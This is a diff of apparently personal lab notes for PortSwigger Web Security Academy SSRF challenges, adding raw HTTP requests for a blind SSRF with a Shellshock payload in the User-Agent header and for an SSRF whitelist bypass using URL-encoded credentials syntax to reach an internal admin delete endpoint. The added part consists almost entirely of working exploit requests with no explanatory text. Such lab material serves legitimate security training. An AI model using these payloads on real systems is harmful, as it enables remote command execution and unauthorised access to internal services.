@@ -149,3 +149,54 @@ Priority: u=1, i
 
 stockApi=%2fproduct%2fnextProduct%3fcurrentProductId%3d8%26path%3dhttp%3a%2f%2f192.168.0.12%3a8080%2fadmin/delete?username=carlos
 ```
+
+
+## 6. Blind SSRF with Shellshock exploitation
+
+```
+GET /product?productId=1 HTTP/2
+Host: 0ab2003b03a5b50c806dfd7d005b00b6.web-security-academy.net
+Cookie: session=ZPSoosMXae9scLbwnRoI8MhGagdcjTdY
+Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+User-Agent: () { :; }; /bin/bash -c sleep 10
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: http://192.168.0.§1§:8080
+Accept-Encoding: gzip, deflate, br
+Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
+Priority: u=0, i
+
+
+```
+
+
+## 7. SSRF with whitelist-based input filter
+
+```
+POST /product/stock HTTP/2
+Host: 0aa5005f04f14b8285bccccb00ea0052.web-security-academy.net
+Cookie: session=qCNHhxq2s4BXpnhtp6pX1c2uFa7s2hbx
+Content-Length: 85
+Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
+Sec-Ch-Ua-Platform: "Windows"
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Accept: */*
+Origin: https://0aa5005f04f14b8285bccccb00ea0052.web-security-academy.net
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://0aa5005f04f14b8285bccccb00ea0052.web-security-academy.net/product?productId=1
+Accept-Encoding: gzip, deflate, br
+Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
+Priority: u=1, i
+
+stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
+```
